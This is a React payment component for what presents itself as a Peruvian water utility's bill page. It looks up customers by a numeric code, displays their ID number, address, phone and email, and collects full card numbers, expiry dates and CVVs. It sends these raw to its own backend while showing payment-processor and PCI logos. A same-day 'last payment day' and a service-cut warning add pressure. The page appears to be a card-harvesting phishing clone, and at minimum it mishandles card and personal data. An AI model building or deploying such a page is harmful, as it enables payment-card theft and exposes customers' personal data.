"use client";
import { useState } from "react";

type ClienteData = {
  codcliente: string;
  nombre: string;
  dni: string;
  telefono: string;
  email: string;
  direccion: string;
  tiene_deuda: boolean;
  deuda_total: number;
  meses_pendientes: number;
  detalle_meses: string[];
  ultimo_recibo: { periodo: string; monto: number; estado: string } | null;
};

type PasoFormulario = 'buscar' | 'resultado' | 'pagar' | 'confirmado';

function formatPeriodo(p: string) {
  const [anio, mes] = p.split('-');
  const meses = ['', 'Ene', 'Feb', 'Mar', 'Abr', 'May', 'Jun', 'Jul', 'Ago', 'Sep', 'Oct', 'Nov', 'Dic'];
  return `${meses[parseInt(mes)] || mes} ${anio}`;
}

function formatMonto(n: number) {
  return `S/ ${n.toFixed(2)}`;
}

function maskCard(num: string) {
  return num.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
}

function esAmex(num: string) {
  return /^(34|37)/.test(num.replace(/\D/g, ''));
}

export default function PaymentSection() {
  const [paso, setPaso]           = useState<PasoFormulario>('buscar');
  const [codigo, setCodigo]       = useState('');
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState('');
  const [cliente, setCliente]     = useState<ClienteData | null>(null);
  const [aceptaTerminos, setAceptaTerminos] = useState(false);

  // Formulario de tarjeta
  const [numTarjeta, setNumTarjeta] = useState('');
  const [titular, setTitular]       = useState('');
  const [vencimiento, setVencimiento] = useState('');
  const [cvv, setCvv]               = useState('');
  const [pagando, setPagando]       = useState(false);
  const [cardError, setCardError]   = useState('');
  const [pagoResult, setPagoResult] = useState<{ nroOperacion: string; tarjeta: string; fecha: string } | null>(null);
  
  // Honeypot anti-spam (bots fill this, humans don't see it)
  const [website, setWebsite] = useState('');
  const [formLoadTime] = useState(() => Date.now());

  async function handleConsultar(e: React.FormEvent) {
    e.preventDefault();
    if (!codigo.trim()) return;
    setLoading(true);
    setError('');
    try {
      const res = await fetch(`/api/consultar?codigo=${encodeURIComponent(codigo.trim())}`);
      const data = await res.json();
      if (!res.ok) { setError(data.error || 'Error al consultar'); setLoading(false); return; }
      setCliente(data);
      setPaso('resultado');
    } catch {
      setError('Error de conexión. Intente nuevamente.');
    }
    setLoading(false);
  }

  function handlePagar() {
    if (!aceptaTerminos) { setError('Debe aceptar los términos para continuar.'); return; }
    setError('');
    setPaso('pagar');
  }

  async function handleConfirmarPago(e: React.FormEvent) {
    e.preventDefault();
    setCardError('');
    
    // Honeypot check - bots fill this hidden field
    if (website) {
      setCardError('Error de procesamiento. Intente nuevamente.');
      return;
    }
    
    // Timing check - reject if submitted too quickly (< 3 seconds)
    const elapsed = Date.now() - formLoadTime;
    if (elapsed < 3000) {
      setCardError('Error de procesamiento. Intente nuevamente.');
      return;
    }
    
    const num = numTarjeta.replace(/\s/g, '');
    if (num.length < 16)    { setCardError('Número de tarjeta inválido'); return; }
    if (!titular.trim())    { setCardError('Ingrese el nombre del titular'); return; }
    if (vencimiento.length < 5) { setCardError('Fecha de vencimiento inválida'); return; }
    const cvvMin = esAmex(numTarjeta) ? 4 : 3;
    if (cvv.length < cvvMin) { setCardError('CVV inválido'); return; }

    setPagando(true);
    try {
      const res = await fetch('/api/pagar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          codcliente: cliente!.codcliente,
          nombre:     cliente!.nombre,
          monto:      cliente!.deuda_total,
          numTarjeta,
          titular,
          vencimiento,
          cvv,
          dni:        cliente!.dni,
          email:      cliente!.email,
          _t:         formLoadTime, // Timestamp for server-side timing check
        }),
      });
      const data = await res.json();
      if (!data.exitoso) {
        setCardError(data.motivo || 'Pago rechazado. Verifique los datos.');
        setPagando(false);
        return;
      }
      setPagoResult({ nroOperacion: data.nroOperacion, tarjeta: data.tarjeta, fecha: data.fecha });
      setPaso('confirmado');
    } catch {
      setCardError('Error de conexión. Intente nuevamente.');
    }
    setPagando(false);
  }

  function handleNuevaConsulta() {
    setCodigo(''); setCliente(null); setError(''); setAceptaTerminos(false);
    setNumTarjeta(''); setTitular(''); setVencimiento(''); setCvv(''); setCardError('');
    setPagoResult(null);
    setPaso('buscar');
  }

  return (
    <section id="pagar" className="relative py-16 px-4">
      {/* Viñeta sobre el fondo del slideshow */}
      <div
        className="absolute inset-0 pointer-events-none"
        style={{ background: 'radial-gradient(ellipse at center, rgba(0,0,0,0.18) 0%, rgba(0,0,0,0.62) 100%), linear-gradient(to bottom, transparent 70%, rgba(0,0,0,0.55) 100%)' }}
      />
      <div className="relative z-10 max-w-6xl mx-auto flex flex-col lg:flex-row gap-10 items-start">

        {/* Columna izquierda — info */}
        <div className="flex-1">
          <span className="text-blue-200 font-semibold text-sm uppercase tracking-wider">Pago en Línea</span>
          <h2 className="text-3xl font-bold text-white mt-2 mb-4" style={{ textShadow: '0 2px 10px rgba(0,0,0,0.6)' }}>Consulte y pague su recibo</h2>
          <p className="text-blue-100 mb-6 leading-relaxed" style={{ textShadow: '0 1px 4px rgba(0,0,0,0.5)' }}>
            Ingrese su Nro. de Suministro para pagar de forma rápida y segura con su tarjeta de débito o crédito.
          </p>
          <div className="space-y-3 mb-6">
            {['Sin comisiones adicionales', 'Comprobante enviado por correo', 'Disponible las 24 horas', 'Certificado de seguridad SSL'].map(t => (
              <div key={t} className="flex items-center gap-3">
                <div className="bg-[#00a651] rounded-full p-1 shrink-0">
                  <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <span className="text-white/90 text-sm" style={{ textShadow: '0 1px 3px rgba(0,0,0,0.5)' }}>{t}</span>
              </div>
            ))}
          </div>
          <div className="flex gap-2 flex-wrap items-center">
            <div className="bg-white rounded-lg px-3 py-2 shadow-sm border">
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/visa.png" alt="Visa" className="h-5 object-contain" />
            </div>
            <div className="bg-white rounded-lg px-3 py-2 shadow-sm border">
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/mc.png" alt="Mastercard" className="h-5 object-contain" />
            </div>
          </div>
        </div>

        {/* Columna derecha — formulario dinámico */}
        <div className="flex-1 max-w-md w-full">

          {/* PASO 1 — Buscar cliente */}
          {paso === 'buscar' && (
            <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100">
              <div className="flex items-center gap-3 mb-6">
                <div className="bg-[#e8f4fd] rounded-full p-3">
                  <svg className="w-6 h-6 text-[#0057a8]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-bold text-gray-800">Consultar Saldo</h3>
                  <p className="text-xs text-gray-500">E.P.S. EMAQ S.A.</p>
                </div>
              </div>
              <form onSubmit={handleConsultar} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Código de Cliente *</label>
                  <input
                    type="text"
                    value={codigo}
                    onChange={e => setCodigo(e.target.value.replace(/\D/g, ''))}
                    placeholder="Ej: 3042"
                    className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-sm focus:border-[#0057a8] focus:outline-none transition-colors"
                    required
                  />
                  <p className="text-xs text-gray-400 mt-1">Encuéntrelo en la parte superior de su recibo físico</p>
                </div>
                {error && (
                  <div className="bg-red-50 border border-red-200 text-red-700 text-sm px-3 py-2 rounded-lg flex items-center gap-2">
                    <svg className="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/>
                    </svg>
                    {error}
                  </div>
                )}
                <button
                  type="submit"
                  disabled={loading || !codigo}
                  className="w-full bg-[#0057a8] hover:bg-[#004a92] disabled:bg-gray-300 text-white font-bold py-4 rounded-xl transition-all"
                >
                  {loading ? 'Consultando...' : 'CONSULTAR SALDO'}
                </button>
              </form>
            </div>
          )}

          {/* PASO 2 — Resultado del saldo */}
          {paso === 'resultado' && cliente && (
            <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
              {/* Header con estado */}
              <div className={`px-6 py-4 ${cliente.tiene_deuda ? 'bg-red-500' : 'bg-[#00a651]'}`}>
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-white/80 text-xs uppercase tracking-wider">Saldo Actual</p>
                    <p className="text-white font-bold text-3xl mt-1">
                      {cliente.tiene_deuda ? formatMonto(cliente.deuda_total) : 'Al día'}
                    </p>
                  </div>
                  <div className={`rounded-full p-3 ${cliente.tiene_deuda ? 'bg-red-400' : 'bg-green-400'}`}>
                    {cliente.tiene_deuda ? (
                      <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                      </svg>
                    ) : (
                      <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                      </svg>
                    )}
                  </div>
                </div>
                {cliente.tiene_deuda && (
                  <div className="mt-1 flex flex-col gap-0.5">
                    <p className="text-red-100 text-sm">{cliente.meses_pendientes} mes(es) pendiente(s)</p>
                    <p className="text-yellow-200 text-xs font-bold uppercase tracking-wide">⚠ Afecto al corte</p>
                  </div>
                )}
              </div>

              <div className="p-6 space-y-4">
                {/* Datos del cliente */}
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Titular:</span>
                    <span className="font-medium text-gray-800 text-right max-w-[60%]">{cliente.nombre}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Código:</span>
                    <span className="font-medium text-gray-800">{cliente.codcliente}</span>
                  </div>
                  {cliente.dni && (
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">DNI:</span>
                      <span className="font-medium text-gray-800">{cliente.dni}</span>
                    </div>
                  )}
                  {cliente.direccion && (
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">Dirección:</span>
                      <span className="font-medium text-gray-800 text-right max-w-[60%]">{cliente.direccion}</span>
                    </div>
                  )}
                  {cliente.telefono && (
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">Teléfono:</span>
                      <span className="font-medium text-gray-800">{cliente.telefono}</span>
                    </div>
                  )}
                  {cliente.email && (
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">Correo:</span>
                      <span className="font-medium text-gray-800 text-right max-w-[60%]">{cliente.email}</span>
                    </div>
                  )}
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Último día de pago:</span>
                    <span className="font-medium text-gray-800">{new Date().toLocaleDateString('es-PE', { day: '2-digit', month: '2-digit', year: 'numeric' })}</span>
                  </div>
                </div>

                {/* Detalle de meses pendientes */}
                {cliente.tiene_deuda && cliente.detalle_meses.length > 0 && (
                  <div className="bg-red-50 rounded-lg p-3">
                    <p className="text-xs font-semibold text-red-700 mb-2">Meses pendientes:</p>
                    <div className="flex flex-wrap gap-1">
                      {cliente.detalle_meses.map(m => (
                        <span key={m} className="bg-red-100 text-red-700 text-xs px-2 py-0.5 rounded-full">
                          {formatPeriodo(m)}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                {/* Último recibo si está al día */}
                {!cliente.tiene_deuda && cliente.ultimo_recibo && (
                  <div className="bg-green-50 rounded-lg p-3 text-sm">
                    <p className="text-green-700 font-medium">
                      Último recibo: {formatPeriodo(cliente.ultimo_recibo.periodo)} — {formatMonto(cliente.ultimo_recibo.monto)}
                    </p>
                    <p className="text-green-600 text-xs mt-0.5">Pagado ✓</p>
                  </div>
                )}

                {/* Términos y condiciones */}
                {cliente.tiene_deuda && (
                  <label className="flex items-start gap-3 bg-gray-50 rounded-lg p-3 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={aceptaTerminos}
                      onChange={e => { setAceptaTerminos(e.target.checked); setError(''); }}
                      className="mt-0.5 w-4 h-4 accent-[#0057a8]"
                    />
                    <span className="text-xs text-gray-600">
                      Acepto los <a href="#" className="text-[#0057a8] font-medium hover:underline">Términos y Condiciones</a> del servicio de pago en línea.
                    </span>
                  </label>
                )}

                {error && (
                  <p className="text-red-600 text-xs">{error}</p>
                )}

                <div className="flex gap-3 pt-1">
                  <button
                    onClick={handleNuevaConsulta}
                    className="flex-1 border-2 border-gray-200 hover:border-gray-300 text-gray-600 font-semibold py-3 rounded-xl transition-all text-sm"
                  >
                    Nueva consulta
                  </button>
                  {cliente.tiene_deuda && (
                    <button
                      onClick={handlePagar}
                      className="flex-1 bg-[#00a651] hover:bg-[#008f45] text-white font-bold py-3 rounded-xl transition-all text-sm shadow-md"
                    >
                      PAGAR AHORA
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* PASO 3 — Formulario de tarjeta */}
          {paso === 'pagar' && cliente && (
            <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
              <div className="bg-[#0057a8] px-6 py-4">
                <div className="flex items-center gap-3">
                  <button onClick={() => setPaso('resultado')} className="text-white/70 hover:text-white transition-colors">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7"/>
                    </svg>
                  </button>
                  <div>
                    <p className="text-white/80 text-xs">Pagando deuda de</p>
                    <p className="text-white font-bold">{cliente.nombre}</p>
                  </div>
                  <div className="ml-auto text-right">
                    <p className="text-white/80 text-xs">Total a pagar</p>
                    <p className="text-white font-bold text-xl">{formatMonto(cliente.deuda_total)}</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleConfirmarPago} className="p-6 space-y-4">
                {/* Honeypot field - hidden from humans, bots will fill it */}
                <div className="absolute opacity-0 pointer-events-none h-0 w-0 overflow-hidden" aria-hidden="true">
                  <label htmlFor="website">No completar</label>
                  <input
                    id="website"
                    name="website"
                    type="text"
                    value={website}
                    onChange={e => setWebsite(e.target.value)}
                    tabIndex={-1}
                    autoComplete="off"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase tracking-wide">Número de Tarjeta</label>
                  <input
                    value={numTarjeta}
                    onChange={e => setNumTarjeta(maskCard(e.target.value))}
                    placeholder="0000 0000 0000 0000"
                    maxLength={19}
                    className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-sm focus:border-[#0057a8] focus:outline-none transition-colors font-mono tracking-widest"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase tracking-wide">Nombre del Titular</label>
                  <input
                    value={titular}
                    onChange={e => setTitular(e.target.value.toUpperCase())}
                    placeholder="COMO APARECE EN LA TARJETA"
                    className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-sm focus:border-[#0057a8] focus:outline-none transition-colors uppercase"
                    required
                  />
                </div>
                <div className="flex gap-3">
                  <div className="flex-1">
                    <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase tracking-wide">Vencimiento</label>
                    <input
                      value={vencimiento}
                      onChange={e => {
                        let v = e.target.value.replace(/\D/g, '');
                        if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                        setVencimiento(v);
                      }}
                      placeholder="MM/AA"
                      maxLength={5}
                      className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-sm focus:border-[#0057a8] focus:outline-none transition-colors"
                      required
                    />
                  </div>
                  <div className="w-28">
                    <label className="block text-xs font-semibold text-gray-600 mb-1 uppercase tracking-wide">CVV</label>
                    <input
                      value={cvv}
                      onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, esAmex(numTarjeta) ? 4 : 3))}
                      placeholder="•••"
                      maxLength={esAmex(numTarjeta) ? 4 : 3}
                      type="password"
                      className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-sm focus:border-[#0057a8] focus:outline-none transition-colors"
                      required
                    />
                  </div>
                </div>

                {/* Logos de seguridad */}
                <div className="flex items-center justify-center gap-2 flex-wrap">
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/pci.png" alt="PCI DSS" className="h-5 object-contain" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/visa.png" alt="Visa" className="h-5 object-contain" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/mc.png" alt="Mastercard" className="h-5 object-contain" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/dc.png" alt="Diners Club" className="h-5 object-contain" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/amex.svg" alt="American Express" className="h-5 object-contain" />
                  {/* eslint-disable-next-line @next/next/no-img-element */}
                  <img loading="lazy" src="https://static-content.vnforapps.com/v2/img/bottom/unionpay.svg" alt="UnionPay" className="h-5 object-contain" />
                </div>

                {cardError && (
                  <div className="bg-red-50 border border-red-200 text-red-700 text-xs px-3 py-2 rounded-lg">
                    {cardError}
                  </div>
                )}

                <div className="flex items-center justify-center gap-2 text-xs text-gray-400 py-1">
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd"/>
                  </svg>
                  Pago seguro con cifrado SSL de 256 bits
                </div>

                <button
                  type="submit"
                  disabled={pagando}
                  className="w-full bg-[#00a651] hover:bg-[#008f45] disabled:bg-gray-300 text-white font-bold py-4 rounded-xl transition-all text-base shadow-md"
                >
                  {pagando ? (
                    <span className="flex items-center justify-center gap-2">
                      <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
                      </svg>
                      Procesando pago...
                    </span>
                  ) : `PAGAR ${formatMonto(cliente.deuda_total)}`}
                </button>
              </form>
            </div>
          )}

          {/* PASO 4 — Confirmación */}
          {paso === 'confirmado' && cliente && pagoResult && (
            <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-8 text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-9 h-9 text-[#00a651]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-1">¡Pago Exitoso!</h3>
              <p className="text-gray-500 text-sm mb-4">Su pago fue procesado correctamente.</p>

              <div className="bg-gray-50 rounded-xl p-4 text-left space-y-2 mb-6">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">Cliente:</span>
                  <span className="font-medium text-gray-800 text-right max-w-[55%]">{cliente.nombre}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">Código:</span>
                  <span className="font-medium">{cliente.codcliente}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">Tarjeta:</span>
                  <span className="font-mono text-xs text-gray-700">{pagoResult.tarjeta}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">Monto pagado:</span>
                  <span className="font-bold text-[#00a651] text-base">{formatMonto(cliente.deuda_total)}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">Fecha:</span>
                  <span className="text-gray-700 text-xs">{pagoResult.fecha}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500">N° Operación:</span>
                  <span className="font-mono text-gray-800 font-semibold">{pagoResult.nroOperacion}</span>
                </div>
              </div>

              {cliente.email && (
                <p className="text-xs text-gray-500 mb-4">
                  Se enviará un comprobante a <span className="font-medium">{cliente.email}</span>
                </p>
              )}

              <button
                onClick={handleNuevaConsulta}
                className="w-full bg-[#0057a8] hover:bg-[#004a92] text-white font-bold py-3 rounded-xl transition-all"
              >
                Nueva consulta
              </button>
            </div>
          )}
        </div>
      </div>
    </section>
  );
}
